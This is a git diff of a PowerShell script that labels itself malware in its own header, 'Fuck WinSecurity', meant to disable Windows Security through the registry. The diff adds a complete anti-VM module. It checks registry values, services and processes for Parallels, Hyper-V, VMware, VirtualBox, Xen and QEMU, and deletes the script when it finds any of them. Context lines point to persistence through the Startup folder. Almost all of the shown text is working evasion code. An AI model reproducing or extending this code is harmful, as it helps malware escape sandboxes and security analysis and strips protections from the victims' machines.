@@ -1,23 +1,23 @@
-# |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
-# |                                    |   ___                          _         ____    _                          |
-# | Title        : Fuck WinSecurity    |  |_ _|    __ _   _ __ ___     (_)  ___  |  _ \  (_)   __ _   _   _    ___   |
-# | Author       : root@isPique:~$     |   | |    / _` | | '_ ` _ \    | | / __| | |_) | | |  / _` | | | | |  / _ \  |
-# | Version      : 1.0                 |   | |   | (_| | | | | | | |   | | \__ \ |  __/  | | | (_| | | | | | |  __/  |
-# | Category     : PowerShell Malware  |  |___|   \__,_| |_| |_| |_|   |_| |___/ |_|     |_|  \__, |  \__,_|  \___|  |
-# | Target       : Windows 10 - 11     |                                                         |_|                 |
-# | Mode         : Offensive           |                                                                             |
-# |                                    |     My crime is that of curiosity                         |\__/,|   (`\     |
-# | Socials:                           |      and yea curiosity killed the cat                     |_ _  |.--.) )    |
-# | https://github.com/isPique         |       but satisfaction brought him back                   ( T   )     /     |
-# | https://instagram.com/omrefarukk   |                                                          (((^_(((/(((_/     |
-# |____________________________________|_____________________________________________________________________________|
+# |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
+# |                                    |   ___                         _         ____    _                          |
+# | Title        : Fuck WinSecurity    |  |_ _|   __ _   _ __ ___     (_)  ___  |  _ \  (_)   __ _   _   _    ___   |
+# | Author       : root@isPique:~$     |   | |   / _` | | '_ ` _ \    | | / __| | |_) | | |  / _` | | | | |  / _ \  |
+# | Version      : 2.0                 |   | |  | (_| | | | | | | |   | | \__ \ |  __/  | | | (_| | | | | | |  __/  |
+# | Category     : PowerShell Malware  |  |___|  \__,_| |_| |_| |_|   |_| |___/ |_|     |_|  \__, |  \__,_|  \___|  |
+# | Target       : Windows 10 - 11     |                                                        |_|                 |
+# | Mode         : Offensive           |                                                                            |
+# |                                    |     My crime is that of curiosity                         |\__/,|   (`\    |
+# | Socials:                           |      and yea curiosity killed the cat                     |_ _  |.--.) )   |
+# | https://github.com/isPique         |       but satisfaction brought him back                   ( T   )     /    |
+# | https://instagram.com/omrefarukk   |                                                          (((^_(((/(((_/    |
+# |____________________________________|____________________________________________________________________________|
 
 <#
 .SYNOPSIS
     This script is designed to disable Window Security features via regedit.
 .NOTES
     This script was NOT optimized to shorten and obfuscate the code but rather intended to have as much readability as possible for new coders to learn!
-    Anti-VM feature will be added soon.
+    Edit: Anti-VM feature has been added. *09-08-2024*
 .LINK
     https://github.com/isPique/Fuck-Windows-Security
 #>
@@ -29,6 +29,250 @@ $ErrorActionPreference = "SilentlyContinue"
 $ScriptPath = $MyInvocation.MyCommand.Path
 $ExePath = (Get-Process -Id $PID).Path
 $FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }
+
+# These functions will identify which virtual environment the script is running in.
+function Test-ProcessExists {
+    param (
+        [string[]]$Processes
+    )
+    foreach ($proc in $Processes) {
+        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
+            return $true
+        }
+    }
+    return $false
+}
+
+function Test-ServiceExists {
+    param (
+        [string[]]$Services
+    )
+    foreach ($service in $Services) {
+        if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
+            return $true
+        }
+    }
+    return $false
+}
+
+function Test-RegistryKeyExists {
+    param (
+        [string[]]$Keys
+    )
+    foreach ($key in $Keys) {
+        if (Test-Path "Registry::$key") {
+            return $true
+        }
+    }
+    return $false
+}
+
+function Test-RegistryValueMatch {
+    param (
+        [string]$Key,
+        [string]$ValueName,
+        [string]$Pattern
+    )
+    try {
+        $value = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
+        if ($value.$ValueName -match $Pattern) {
+            return $true
+        }
+    } catch {
+        return $false
+    }
+    return $false
+}
+
+function Get-RegistryValueString {
+    param (
+        [string]$Key,
+        [string]$ValueName
+    )
+    try {
+        $value = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
+        return $value.$ValueName
+    } catch {
+        return $null
+    }
+}
+
+function Test-Parallels {
+    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
+    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
+    if ($biosVersion -match "parallels" -or $videoBiosVersion -match "parallels") {
+        return $true
+    }
+    return $false
+}
+
+function Test-HyperV {
+    $physicalHost = Get-RegistryValueString -Key "HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters" -ValueName "PhysicalHostNameFullyQualified"
+    if ($physicalHost) {
+        Write-Host "This is a Hyper-V Virtual Machine running on physical host $physicalHost"
+        return $true
+    }
+
+    $sfmsvals = Get-ChildItem "Registry::HKLM\SOFTWARE\Microsoft" -Name
+    if ($sfmsvals -contains "Hyper-V" -or $sfmsvals -contains "VirtualMachine") {
+        return $true
+    }
+
+    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
+    if ($biosVersion -match "vrtual" -or $biosVersion -eq "Hyper-V") {
+        return $true
+    }
+
+    if (Test-RegistryKeyExists -Keys $keys) {
+        return $true
+    }
+
+    $hypervServices = @("vmicexchange")
+    if (Test-ServiceExists -Services $hypervServices) {
+        return $true
+    }
+
+    return $false
+}
+
+function Test-VMware {
+    $vmwareServices = @("vmdebug", "vmmouse", "VMTools", "VMMEMCTL", "tpautoconnsvc", "tpvcgateway", "vmware", "wmci", "vmx86")
+
+    if (Test-ServiceExists -Services $vmwareServices) {
+        return $true
+    }
+
+    $systemManufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
+    if ($systemManufacturer -match "vmware") {
+        return $true
+    }
+
+    $scsiPort1 = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
+    if ($scsiPort1 -match "vmware") {
+        return $true
+    }
+
+    if (Test-RegistryValueMatch -Key "HKLM\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000" -ValueName "DriverDesc" -Pattern "cl_vmx_svga|VMWare") {
+        return $true
+    }
+
+    $vmwareProcs = @("vmtoolsd", "vmwareservice", "vmwaretray", "vmwareuser")
+
+    if (Test-ProcessExists -Processes $vmwareProcs) {
+        return $true
+    }
+
+    return $false
+}
+
+function Test-VirtualBox {
+    $vboxProcs = @("vboxservice", "vboxtray")
+    $vboxServices = @("VBoxMouse", "VBoxGuest", "VBoxService", "VBoxSF", "VBoxVideo")
+
+    if (Test-ServiceExists -Services $vboxServices -or Test-ProcessExists -Processes $vboxProcs) {
+        return $true
+    }
+
+    $keys = @("HKLM\HARDWARE\ACPI\DSDT\VBOX__")
+    if (Test-RegistryKeyExists -Keys $keys) {
+        return $true
+    }
+
+    for ($i = 0; $i -le 2; $i++) {
+        if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port $i\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier" -Pattern "vbox") {
+            return $true
+        }
+    }
+
+    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
+    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
+    if ($biosVersion -match "vbox" -or $videoBiosVersion -match "virtualbox") {
+        return $true
+    }
+
+    $systemProductName = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
+    if ($systemProductName -match "virtualbox") {
+        return $true
+    }
+
+    return $false
+}
+
+function Test-Xen {
+    $xenProcs = @("xenservice")
+    $xenServices = @("xenevtchn", "xennet", "xennet6", "xensvc", "xenvdb")
+
+    if (Test-ProcessExists -Processes $xenProcs -or Test-ServiceExists -Services $xenServices) {
+        return $true
+    }
+
+    $keys = @("HKLM\HARDWARE\ACPI\DSDT\Xen")
+    if (Test-RegistryKeyExists -Keys $keys) {
+        return $true
+    }
+
+    $systemProductName = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
+    if ($systemProductName -match "xen") {
+        return $true
+    }
+
+    return $false
+}
+
+function Test-QEMU {
+    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
+    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
+    if ($biosVersion -match "qemu" -or $videoBiosVersion -match "qemu") {
+        return $true
+    }
+
+    $scsiPort0 = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
+    $systemManufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
+    if ($scsiPort0 -match "qemu|virtio" -or $systemManufacturer -match "qemu") {
+        return $true
+    }
+
+    if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" -ValueName "ProcessorNameString" -Pattern "qemu") {
+        return $true
+    }
+
+    $keys = @("HKLM\HARDWARE\ACPI\DSDT\BOCHS_")
+    if (Test-RegistryKeyExists -Keys $keys) {
+        return $true
+    }
+
+    return $false
+}
+
+# Function to detect if script is running in a virtual environment
+function Invoke-DetectVirtualMachine {
+    if (Test-Parallels) {
+        return $false
+    } elseif (Test-HyperV) {
+        return $false
+    } elseif (Test-VMware) {
+        return $false
+    } elseif (Test-VirtualBox) {
+        return $false
+    } elseif (Test-Xen) {
+        return $false
+    } elseif (Test-QEMU) {
+        return $false
+    } else {
+        return $true
+    }
+}
+
+# If script is running in a virtual environment delete itself. If not, just continue
+if (-not (Invoke-DetectVirtualMachine)) {
+    if ($ScriptPath) {
+        Remove-Item -Path $FullPath -Force
+    } else {
+        Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
+    }
+}
+
+# Define the startup path for replicating
 $startupPath = Join-Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\'
 
 # Function to check if the script is running as admin
